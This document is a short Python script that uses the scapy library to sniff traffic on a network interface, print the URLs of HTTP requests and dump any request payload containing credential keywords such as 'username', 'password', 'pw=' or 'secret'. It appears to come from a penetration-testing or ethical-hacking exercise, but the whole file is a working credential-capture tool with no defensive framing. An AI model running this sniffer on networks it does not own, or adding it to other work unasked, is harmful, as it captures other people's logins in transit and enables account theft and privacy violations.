#!/usr/bin/env python3
#Python3 script for sniffing packets for pre-defined keywords

#Imports
import scapy.all as scapy
from scapy.layers.http import *

#Store specifies where scapy should store this sniffed information. Defaults to in-memory
#prn specifies the function to run with each packet sniffed
#filter can be udp, tcp, arp, etc. Ports with "port 21", "port 22", etc.
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

#Function to get and return the url of a packet
def get_url(packet):
    host = packet[HTTPRequest].Host
    path = packet[HTTPRequest].Path
    url = host + path
    return url

#Function to only return specified keywords in a packet
def get_login_info(packet):
    if packet.haslayer(Raw):
        load = packet[Raw].load.decode()
        keywords = ["username", "user", "name", "password", "pass", "pwd", "pw=", "secret"]
        for keyword in keywords:
            if keyword in load:
                return load

#Function to process the sniff packet
def process_sniffed_packet(packet):
    #Sniff for HTTP POST Requests
    if packet.haslayer(HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> ", url)
        login_info = get_login_info(packet)
        if login_info:
            print("[+] Possible Username/Password >", login_info, "\n")
    #Sniff for Cookies in HTTP Responses
    #if packet.haslayer(HTTPResponse):
#Interface to sniff
sniff("eth0")